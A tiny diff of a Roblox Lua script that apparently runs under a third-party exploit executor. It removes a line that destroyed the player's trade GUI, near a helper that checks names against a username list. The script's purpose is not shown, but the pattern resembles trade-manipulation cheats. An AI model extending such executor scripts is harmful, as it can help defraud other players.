@@ -17,7 +17,6 @@ local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
 local tradeGui_phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
 
-tradeGui_phone:destroy()
 
 local function isUsernameInList(name)
 	for _, v in ipairs(usernames) do
